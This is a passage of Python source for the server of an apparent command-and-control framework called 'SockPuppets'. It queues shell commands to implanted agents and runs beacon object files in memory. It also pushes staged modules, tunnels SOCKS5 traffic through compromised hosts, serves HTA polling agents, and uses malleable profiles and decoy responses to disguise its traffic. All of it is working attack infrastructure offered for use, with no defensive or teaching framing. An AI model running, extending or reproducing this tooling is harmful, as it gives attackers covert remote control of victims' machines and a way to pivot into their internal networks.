                agent.pending_results.append({
                    'command': command,
                    'output': output,
                    'timestamp': timestamp,
                    'received_at': datetime.now().isoformat()
                })
            else:
                try:
                    agent.response_queue.put_nowait(output)
                except asyncio.QueueFull:
                    pass

            logger.debug(f"HTTP result received from {agent_id}: {command[:50]}...")

            response = {'type': 'result_ack', 'status': 'success'}
            encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
            return web.Response(text=encrypted_response, content_type='text/html')

        except Exception as e:
            logger.error(f"HTTP results error: {e}")
            return web.Response(status=500)

    async def _http_handle_heartbeat(self, request: 'web.Request') -> 'web.Response':
        """Handle heartbeat via HTTP GET"""
        # Check for agent_id in query params (disguised as session token)
        agent_id = request.query.get('sid', '')

        if agent_id and agent_id in self.agents:
            self.agents[agent_id].last_seen = datetime.now()

        # Always return a normal-looking health response
        response = {'type': 'heartbeat_ack', 'status': 'alive'}
        encrypted_response = self.simple_encrypt(json.dumps(response))
        return web.Response(text=encrypted_response, content_type='text/html')

    # ──────────────────────────────────────────────
    # Command dispatch (transport-agnostic)
    # ──────────────────────────────────────────────

    async def send_command_to_agent(self, agent_id: str, command: str) -> str:
        """Queue command for agent and wait for response"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]
        command_id = str(uuid.uuid4())[:8]

        agent.command_history.append({
            'command': command,
            'command_id': command_id,
            'queued_at': datetime.now().isoformat()
        })

        cmd_msg = {
            'type': 'command',
            'command': command,
            'command_id': command_id,
            'timestamp': datetime.now().isoformat()
        }

        event_type = "command_queued" if agent.mode in ("beacon", "http_poll") else "command_sent"
        self.events.emit({
            "event": event_type,
            "agent_id": agent_id,
            "command": command,
            "operator": "cli",
        })

        # HTA agents: thread-safe command delivery
        if agent.mode == 'http_poll':
            with agent._cmd_lock:
                agent.http_pending_commands.append(cmd_msg)
            transport_note = f" via {agent.transport_type.upper()}" if agent.is_http() else ""
            return f"[*] Command queued for beacon{transport_note} (will execute on next checkin)"

        # Beacon mode: queue and return immediately
        if agent.mode == 'beacon':
            await agent.command_queue.put(cmd_msg)
            transport_note = f" via {agent.transport_type.upper()}" if agent.is_http() else ""
            return f"[*] Command queued for beacon{transport_note} (will execute on next checkin in ~{agent.beacon_interval}s)"

        # Streaming mode: use future for command-response correlation
        future = asyncio.get_event_loop().create_future()
        agent.pending_commands[command_id] = future
        await agent.command_queue.put(cmd_msg)

        if not agent.is_http() and agent.websocket not in self.active_connections:
            agent.pending_commands.pop(command_id, None)
            return "Agent is not connected"

        timeout = 60.0 if agent.is_http() else 45.0
        try:
            response = await asyncio.wait_for(future, timeout=timeout)
            return response
        except asyncio.TimeoutError:
            agent.pending_commands.pop(command_id, None)
            return "Command timeout - no response from agent"

    async def send_bof_to_agent(self, agent_id: str, bof_data: str, bof_args: str, entry: str = 'go') -> str:
        """Send BOF execution command to agent."""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        msg = {
            'type': '__bof__',
            'bof_data': bof_data,
            'bof_args': bof_args,
            'bof_entry': entry,
        }

        agent.command_history.append({
            'command': f'__bof__ (entry={entry})',
            'queued_at': datetime.now().isoformat()
        })

        await agent.command_queue.put(msg)

        self.events.emit({
            "event": "bof_executed",
            "agent_id": agent_id,
            "entry": entry,
            "operator": "cli",
        })

        if agent.mode == 'beacon':
            return f"[*] BOF queued for beacon (will execute on next checkin in ~{agent.beacon_interval}s)"

        if agent.is_http():
            try:
                response = await asyncio.wait_for(agent.response_queue.get(), timeout=60.0)
                return response
            except asyncio.TimeoutError:
                return "BOF execution timeout - no response from agent (HTTP)"

        if agent.websocket not in self.active_connections:
            return "Agent is not connected"

        try:
            response = await asyncio.wait_for(agent.response_queue.get(), timeout=60.0)
            return response
        except asyncio.TimeoutError:
            return "BOF execution timeout - no response from agent"

    def get_agent_list(self) -> list:
        """Get list of all agents"""
        return [agent.get_info() for agent in self.agents.values()]

    def get_active_agents(self) -> list:
        """Get list of active agents"""
        active = []
        for agent in self.agents.values():
            if agent.is_http():
                # HTTP agent is active if seen recently
                if agent.mode == 'beacon':
                    max_interval = agent.beacon_interval * 2 + 60
                else:
                    max_interval = 90  # Long-poll timeout + buffer
                time_since = (datetime.now() - agent.last_seen).total_seconds()
                if time_since < max_interval:
                    active.append(agent.get_info())
            else:
                if agent.websocket in self.active_connections:
                    active.append(agent.get_info())
        return active

    def get_agent_results(self, agent_id: str, clear: bool = False) -> list:
        """Get pending results from agent"""
        if agent_id not in self.agents:
            return []

        agent = self.agents[agent_id]
        results = agent.pending_results.copy()

        if clear:
            agent.pending_results.clear()

        return results

    def check_agent_health(self, agent_id: str) -> str:
        """Check if beacon agent might be dead"""
        if agent_id not in self.agents:
            return ""

        agent = self.agents[agent_id]

        # Only check beacons
        if agent.mode != 'beacon':
            return ""

        # Calculate max expected time between checkins
        beacon_interval = agent.beacon_interval
        beacon_jitter_percent = agent.beacon_jitter

        # Max interval = base + jitter + 3 minute grace period
        jitter_seconds = beacon_interval * (beacon_jitter_percent / 100.0)
        max_expected_interval = beacon_interval + jitter_seconds + 180  # 3 minutes grace

        # Check time since last seen
        time_since_last_seen = (datetime.now() - agent.last_seen).total_seconds()

        if time_since_last_seen > max_expected_interval:
            return f"Agent {agent_id} may be dead (last seen {int(time_since_last_seen/60)} minutes ago, expected checkin every {beacon_interval}s)"

        return ""

    async def set_beacon_interval(self, agent_id: str, interval: int) -> str:
        """Set beacon sleep interval for agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]
        agent.beacon_interval = interval

        if agent.is_http():
            # For HTTP agents, queue a set_interval command for next poll
            await agent.command_queue.put(f"__set_interval:{interval}")
            return f"Beacon interval command queued (will apply on next checkin)"

        message = {
            'type': 'set_interval',
            'interval': interval
        }
        encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)

        # For beacon mode, wait for agent to check in
        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    logger.info(f"Set beacon interval for {agent_id} to {interval}s")
                    return f"Beacon interval set to {interval} seconds"
                else:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        return f"Timeout - beacon didn't check in within {max_retries} seconds"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    return "Failed - connection closed"

        return "Failed to set beacon interval"

    async def upgrade_to_streaming(self, agent_id: str) -> str:
        """Upgrade agent from beacon to streaming mode"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.mode == 'streaming':
            return "Agent is already in streaming mode"

        if agent.is_http():
            # For HTTP agents, upgrade means switching to long-poll mode
            agent.mode = 'streaming'
            logger.info(f"Agent {agent_id} upgraded to streaming/long-poll mode via {agent.transport_type.upper()}")
            return f"Agent upgraded to streaming mode (HTTP long-poll)"

        if not self.streaming_module:
            return "Error: Streaming module not available"

        # WebSocket: send upgrade command with streaming module
        message = {
            'type': 'upgrade_mode',
            'mode': 'streaming',
            'module_code': self.streaming_module
        }
        encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)

        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    agent.mode = 'streaming'
                    logger.info(f"Agent {agent_id} upgraded to streaming mode (staged module: {len(self.streaming_module)} bytes)")
                    return f"Agent upgraded to streaming mode (loaded {len(self.streaming_module)} byte module)"
                else:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        return f"Upgrade timeout - beacon didn't check in within {max_retries} seconds"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    return "Upgrade failed - connection closed"

        return "Upgrade failed"

    async def upgrade_to_websocket(self, agent_id: str, ws_host: str = None, ws_port: int = None) -> str:
        """Upgrade HTTP agent to WebSocket transport"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if not agent.is_http():
            return "Agent is already using WebSocket transport"

        # Find the WebSocket listener to get its host/port
        if ws_host is None or ws_port is None:
            for name, info in self.listeners.items():
                if info['type'] == 'websocket':
                    ws_host = info['host']
                    ws_port = info['port']
                    break

        if ws_host is None or ws_port is None:
            return "No WebSocket listener running. Start one first with 'start [host] [port]'"

        # Queue upgrade command for the HTTP agent
        upgrade_cmd = json.dumps({
            'type': 'upgrade_websocket',
            'ws_host': ws_host,
            'ws_port': ws_port
        })
        await agent.command_queue.put(f"__upgrade_ws:{upgrade_cmd}")
        return f"WebSocket upgrade command queued (agent will connect to ws://{ws_host}:{ws_port})"

    async def downgrade_to_beacon(self, agent_id: str, interval: int = 60) -> str:
        """Downgrade agent from streaming to beacon mode"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.mode == 'beacon':
            return "Agent is already in beacon mode"

        if agent.is_http():
            # For HTTP agents, just switch mode
            agent.mode = 'beacon'
            agent.beacon_interval = interval
            logger.info(f"Agent {agent_id} downgraded to beacon mode ({interval}s) via {agent.transport_type.upper()}")
            return f"Agent downgraded to beacon mode ({interval}s interval)"

        if agent.websocket not in self.active_connections:
            return "Agent not connected (cannot downgrade)"

        message = {
            'type': 'downgrade_mode',
            'mode': 'beacon',
            'interval': interval
        }
        encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)

        try:
            await agent.websocket.send(encrypted)
            agent.mode = 'beacon'
            agent.beacon_interval = interval
            logger.info(f"Agent {agent_id} downgraded to beacon mode ({interval}s)")
            return f"Agent downgraded to beacon mode ({interval}s interval)"
        except websockets.exceptions.ConnectionClosed:
            return "Downgrade failed - connection closed"

    async def kill_agent(self, agent_id: str) -> str:
        """Send kill command to terminate agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.is_http():
            await agent.command_queue.put("__kill")
            agent.pending_kill = True
            return f"Agent {agent_id} kill command queued (will terminate on next checkin)"

        message = {
            'type': 'kill',
            'command': 'terminate'
        }
        encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)

        max_retries = 60 if agent.mode == 'beacon' else 1
        for attempt in range(max_retries):
            try:
                if agent.websocket in self.active_connections:
                    await agent.websocket.send(encrypted)
                    logger.info(f"Kill command sent to {agent_id}")

                    if agent.websocket in self.active_connections:
                        self.active_connections.discard(agent.websocket)
                    del self.agents[agent_id]
                    self.events.emit({
                        "event": "agent_killed",
                        "agent_id": agent_id,
                    })

                    return f"Agent {agent_id} killed successfully"
                else:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                    else:
                        if agent_id in self.agents:
                            del self.agents[agent_id]
                        return f"Kill timeout - agent didn't check in (removed from tracking)"
            except websockets.exceptions.ConnectionClosed:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
                else:
                    if agent_id in self.agents:
                        del self.agents[agent_id]
                    return f"Agent connection closed (removed from tracking)"

        return "Failed to kill agent"

    async def start_socks_proxy(self, agent_id: str, local_port: int) -> str:
        """Start SOCKS5 proxy through agent"""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        if agent.is_http():
            return "SOCKS proxy is not supported over HTTP transport (requires WebSocket)"

        if agent.websocket not in self.active_connections:
            return "Agent not connected"

        if agent.socks_proxy is not None:
            return f"SOCKS proxy already running on port {agent.socks_proxy}"

        try:
            agent.socks_proxy = local_port
            agent.socks_task = asyncio.create_task(self._run_socks_server(agent_id, local_port))

            message = {
                'type': 'socks_init',
                'port': local_port
            }
            encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)
            await agent.websocket.send(encrypted)

            logger.info(f"SOCKS proxy started for {agent_id} on port {local_port}")
            return f"SOCKS proxy started on 127.0.0.1:{local_port}"

        except Exception as e:
            agent.socks_proxy = None
            return f"Failed to start SOCKS proxy: {str(e)}"

    async def _run_socks_server(self, agent_id: str, port: int):
        """Run SOCKS5 server"""
        server = await asyncio.start_server(
            lambda r, w: self._handle_socks_client(agent_id, r, w),
            '127.0.0.1', port
        )
        agent = self.agents.get(agent_id)
        if agent:
            agent.socks_server_obj = server
        logger.info(f"SOCKS server listening on 127.0.0.1:{port}")
        async with server:
            await server.serve_forever()

    async def _handle_socks_client(self, agent_id: str, reader, writer):
        """Handle SOCKS5 client connection"""
        conn_id = str(uuid.uuid4())[:8]
        try:
            agent = self.agents.get(agent_id)
            if not agent or agent.websocket not in self.active_connections:
                writer.close()
                await writer.wait_closed()
                return

            agent.socks_data_queues[conn_id] = asyncio.Queue()

            # SOCKS5 handshake
            data = await reader.read(262)
            if len(data) < 2 or data[0] != 0x05:
                writer.close()
                await writer.wait_closed()
                return

            # No authentication
            writer.write(b'\x05\x00')
            await writer.drain()

            # Get request
            data = await reader.read(4)
            if len(data) != 4:
                writer.close()
                await writer.wait_closed()
                return

            cmd, atyp = data[1], data[3]

            if cmd != 0x01:
                writer.write(b'\x05\x07\x00\x01' + b'\x00' * 6)
                await writer.drain()
                writer.close()
                await writer.wait_closed()
                return

            if atyp == 0x01:  # IPv4
                addr_data = await reader.read(6)
                addr = socket.inet_ntoa(addr_data[:4])
                port = struct.unpack('>H', addr_data[4:])[0]
            elif atyp == 0x03:  # Domain
                addr_len = (await reader.read(1))[0]
                addr_data = await reader.read(addr_len + 2)
                addr = addr_data[:addr_len].decode()
                port = struct.unpack('>H', addr_data[addr_len:])[0]
            elif atyp == 0x04:  # IPv6
                addr_data = await reader.read(18)
                addr = socket.inet_ntop(socket.AF_INET6, addr_data[:16])
                port = struct.unpack('>H', addr_data[16:])[0]
            else:
                writer.write(b'\x05\x08\x00\x01' + b'\x00' * 6)
                await writer.drain()
                writer.close()
                await writer.wait_closed()
                return

            conn_msg = {
                'type': 'socks_connect',
                'host': addr,
                'port': port,
                'conn_id': conn_id
            }
            encrypted = self.simple_encrypt(json.dumps(conn_msg), agent.encryption_key)
            await agent.websocket.send(encrypted)

            try:
                ack = await asyncio.wait_for(agent.socks_data_queues[conn_id].get(), timeout=15.0)
                if isinstance(ack, dict) and ack.get('type') == 'connect_ack':
                    if not ack.get('success'):
                        writer.write(b'\x05\x05\x00\x01' + b'\x00' * 6)
                        await writer.drain()
                        writer.close()
                        await writer.wait_closed()
                        return
            except asyncio.TimeoutError:
                writer.write(b'\x05\x04\x00\x01' + b'\x00' * 6)
                await writer.drain()
                writer.close()
                await writer.wait_closed()
                return

            writer.write(b'\x05\x00\x00\x01' + b'\x00' * 6)
            await writer.drain()

            task1 = asyncio.create_task(self._relay_socks_to_agent(agent, reader, conn_id))
            task2 = asyncio.create_task(self._relay_agent_to_socks(agent, writer, conn_id))
            try:
                done, pending = await asyncio.wait([task1, task2], return_when=asyncio.FIRST_COMPLETED)
                for t in pending:
                    t.cancel()
            except Exception:
                task1.cancel()
                task2.cancel()

        except Exception as e:
            logger.error(f"SOCKS client error: {e}")
        finally:
            if agent_id in self.agents:
                self.agents[agent_id].socks_data_queues.pop(conn_id, None)
            writer.close()
            await writer.wait_closed()

    async def _relay_socks_to_agent(self, agent: Agent, reader, conn_id: str):
        """Relay data from SOCKS client to agent"""
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break

                msg = {
                    'type': 'socks_send',
                    'conn_id': conn_id,
                    'data': base64.b64encode(data).decode()
                }
                encrypted = self.simple_encrypt(json.dumps(msg), agent.encryption_key)
                await agent.websocket.send(encrypted)
        except Exception as e:
            logger.error(f"Relay to agent error: {e}")

    async def _relay_agent_to_socks(self, agent: Agent, writer, conn_id: str):
        """Relay data from agent to SOCKS client"""
        try:
            q = agent.socks_data_queues.get(conn_id)
            if not q:
                return
            while True:
                data = await q.get()
                if data is None:
                    break
                if isinstance(data, str):
                    data = base64.b64decode(data)
                writer.write(data)
                await writer.drain()
        except Exception as e:
            logger.error(f"Relay to SOCKS error: {e}")

    def _make_hta_handler(self):
        """Create HTTP request handler class for HTA polling agents"""
        server_ref = self

        class HTAHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Suppress default HTTP logging

            def _is_valid_path(self, path):
                """Check if request path matches HTA endpoint or profile URIs"""
                if path == '/hta':
                    return True
                if server_ref.profile:
                    all_uris = server_ref.profile.http_post.uris + server_ref.profile.http_get.uris
                    return path in all_uris
                return False

            def _decode_body(self, body, agent_key=None):
                """Decode request body, reversing profile transforms if active"""
                if server_ref.profile:
                    raw_bytes = ProfileTransformer.decode(body, server_ref.profile.http_post.body)
                    b64_data = base64.b64encode(raw_bytes).decode()
                else:
                    b64_data = body
                if agent_key:
                    return server_ref.simple_decrypt(b64_data, agent_key)
                result, _ = server_ref.try_decrypt(b64_data)
                return result

            def _encode_response(self, encrypted_str):
                """Encode response, applying profile transforms if active"""
                if server_ref.profile:
                    raw_bytes = base64.b64decode(encrypted_str)
                    return ProfileTransformer.encode(raw_bytes, server_ref.profile.http_get.body).encode()
                return encrypted_str.encode()

            def _send_profile_headers(self):
                """Set response headers based on active profile"""
                if server_ref.profile and 'Content-Type' in server_ref.profile.http_get.headers:
                    self.send_header('Content-Type', server_ref.profile.http_get.headers['Content-Type'])
                else:
                    self.send_header('Content-Type', 'text/plain')

            def do_POST(self):
                if not self._is_valid_path(self.path):
                    self.send_error(404)
                    return

                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8', errors='replace')

                try:
                    decrypted = self._decode_body(body)
                    data = json.loads(decrypted)
                    msg_type = data.get('type')

                    if msg_type == 'register':
                        agent_id = str(uuid.uuid4())[:8]
                        metadata = data.get('metadata', {})
                        metadata['ip'] = self.client_address[0]
                        agent = server_ref.register_agent_common(agent_id, metadata, 'hta')
                        agent.mode = 'http_poll'
                        agent.c2s_key, agent.s2c_key = server_ref.derive_agent_keys(agent_id)
                        server_ref.events.emit({
                            "event": "agent_registered",
                            "agent": agent.get_info(),
                        })

                        response = {'type': 'registered', 'agent_id': agent_id, 'status': 'success'}
                        encrypted = server_ref.simple_encrypt(json.dumps(response), agent.encryption_key)
                        self.send_response(200)
                        self._send_profile_headers()
                        self.end_headers()
                        self.wfile.write(self._encode_response(encrypted))

                    elif msg_type == 'checkin':
                        agent_id = data.get('agent_id', '')
                        agent_key = None
                        if agent_id in server_ref.agents:
                            agent = server_ref.agents[agent_id]
                            agent.last_seen = datetime.now()
                            agent_key = agent.encryption_key

                            with agent._cmd_lock:
                                if agent.http_pending_commands:
                                    cmd_msg = agent.http_pending_commands.pop(0)
                                    response = cmd_msg if isinstance(cmd_msg, dict) else {'type': 'command', 'command': cmd_msg, 'timestamp': datetime.now().isoformat()}
                                else:
                                    response = {'type': 'checkin_ack', 'agent_id': agent_id, 'status': 'success'}
                        else:
                            response = {'type': 'error', 'message': 'Unknown agent'}

                        encrypted = server_ref.simple_encrypt(json.dumps(response), agent_key)
                        self.send_response(200)
                        self._send_profile_headers()
                        self.end_headers()
                        self.wfile.write(self._encode_response(encrypted))

                    elif msg_type == 'response':
                        agent_id = data.get('agent_id', '')
                        if agent_id in server_ref.agents:
                            agent = server_ref.agents[agent_id]
                            agent.last_seen = datetime.now()
                            output = data.get('output', '')
                            command_id = data.get('command_id', '')
                            if command_id and command_id in agent.pending_commands:
                                future = agent.pending_commands.pop(command_id)
                                if not future.done():
                                    future.get_loop().call_soon_threadsafe(future.set_result, output)
                            else:
                                agent.response_queue._loop.call_soon_threadsafe(
                                    agent.response_queue.put_nowait, output
                                )
                            agent.pending_results.append({
                                'command': data.get('command', ''),
                                'output': output,
                                'timestamp': data.get('timestamp', ''),
                                'received_at': datetime.now().isoformat()
                            })

                        self.send_response(200)
                        self.send_header('Content-Type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(b'ok')

                    else:
                        self.send_response(200)
                        self.end_headers()

                except Exception as e:
                    logger.error(f"HTA handler error: {e}")
                    self.send_error(500)

        return HTAHandler

    def _start_hta_server(self, host: str, port: int):
        """Start HTTP polling server for HTA agents in a background thread"""
        handler_class = self._make_hta_handler()
        try:
            httpd = HTTPServer((host, port), handler_class)
            logger.info(f"HTA polling endpoint started on {host}:{port}/hta")
            httpd.serve_forever()
        except Exception as e:
            logger.warning(f"Could not start HTA polling endpoint on port {port}: {e}")

    # ──────────────────────────────────────────────
    # Listener Management
    # ──────────────────────────────────────────────

    async def start_ws_listener(self, host: str = '0.0.0.0', port: int = 8443):
        """Start WebSocket listener"""
        listener_name = f"ws_{port}"
        if listener_name in self.listeners:
            logger.warning(f"WebSocket listener already running on port {port}")
            return

        logger.info(f"Starting WebSocket listener on {host}:{port}")
        server = await websockets.serve(self.handle_agent, host, port, max_size=10485760)

        self.listeners[listener_name] = {
            'type': 'websocket',
            'host': host,
            'port': port,
            'server': server,
            'started_at': datetime.now().isoformat()
        }
        logger.info(f"WebSocket listener started on {host}:{port}")

    async def start_http_listener(self, host: str = '0.0.0.0', port: int = 8080):
        """Start HTTP listener"""
        if web is None:
            raise ImportError("aiohttp is required for HTTP listeners. Install with: pip install aiohttp")

        listener_name = f"http_{port}"
        if listener_name in self.listeners:
            logger.warning(f"HTTP listener already running on port {port}")
            return

        app = self._create_http_app()
        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, host, port)
        await site.start()

        self.listeners[listener_name] = {
            'type': 'http',
            'host': host,
            'port': port,
            'runner': runner,
            'site': site,
            'started_at': datetime.now().isoformat()
        }
        logger.info(f"HTTP listener started on {host}:{port}")

    async def start_https_listener(self, host: str = '0.0.0.0', port: int = 443,
                                    cert_path: Optional[str] = None, key_path: Optional[str] = None):
        """Start HTTPS listener"""
        if web is None:
            raise ImportError("aiohttp is required for HTTPS listeners. Install with: pip install aiohttp")

        listener_name = f"https_{port}"
        if listener_name in self.listeners:
            logger.warning(f"HTTPS listener already running on port {port}")
            return

        ssl_ctx = self._get_ssl_context(cert_path, key_path)
        if ssl_ctx is None:
            raise RuntimeError("Failed to create SSL context")

        app = self._create_http_app()
        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, host, port, ssl_context=ssl_ctx)
        await site.start()

        self.listeners[listener_name] = {
            'type': 'https',
            'host': host,
            'port': port,
            'runner': runner,
            'site': site,
            'ssl_context': ssl_ctx,
            'started_at': datetime.now().isoformat()
        }
        logger.info(f"HTTPS listener started on {host}:{port}")

    async def stop_listener(self, listener_type: Optional[str] = None):
        """Stop listener(s). If type is None, stop all."""
        to_remove = []
        for name, info in self.listeners.items():
            if listener_type is None or info['type'] == listener_type:
                try:
                    if info['type'] == 'websocket':
                        info['server'].close()
                        await info['server'].wait_closed()
                    else:
                        await info['runner'].cleanup()
                    logger.info(f"Stopped {info['type'].upper()} listener on port {info['port']}")
                except Exception as e:
                    logger.error(f"Error stopping listener {name}: {e}")
                to_remove.append(name)

        for name in to_remove:
            del self.listeners[name]

    def get_listeners(self) -> list:
        """Get list of active listeners"""
        result = []
        for name, info in self.listeners.items():
            result.append({
                'name': name,
                'type': info['type'],
                'host': info['host'],
                'port': info['port'],
                'started_at': info['started_at']
            })
        return result

    async def start(self, host: str = '0.0.0.0', port: int = 8443):
        """Start the server (WebSocket listener, backward compatible)"""
        await self.start_ws_listener(host, port)
        await asyncio.Future()  # Run forever


# Global server instance
server_instance = None

def get_server_instance():
    """Get or create server instance"""
    global server_instance
    if server_instance is None:
        server_instance = SockPuppetsServer()
    return server_instance


async def start_server(host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                       use_ssl: bool = False, cert_file: str = None, key_file: str = None, profile: str = 'default'):
    """Start the server"""
    global server_instance
    server_instance = SockPuppetsServer(encryption_key)
    # Load malleable C2 profile if specified
    if profile and profile != 'default' and _HAS_PROFILES:
        try:
            server_instance.profile = ProfileParser.load(profile)
            server_instance.profile_name = profile
            logger.info(f"Loaded C2 profile: {profile} ({server_instance.profile.description})")
        except Exception as e:
            logger.warning(f"Failed to load profile '{profile}': {e}")
    await server_instance.start(host, port)


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='SockPuppets Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8443, help='Port to bind to')
    parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key')
    parser.add_argument('--ssl', action='store_true', help='Enable WSS (TLS) mode')
    parser.add_argument('--cert', type=str, help='Path to SSL certificate file')
    parser.add_argument('--cert-key', type=str, help='Path to SSL private key file')
    parser.add_argument('--profile', type=str, default='default', help='Malleable C2 profile name (default: default)')
    args = parser.parse_args()

    asyncio.run(start_server(args.host, args.port, args.key, args.ssl, args.cert, getattr(args, 'cert_key', None), args.profile))
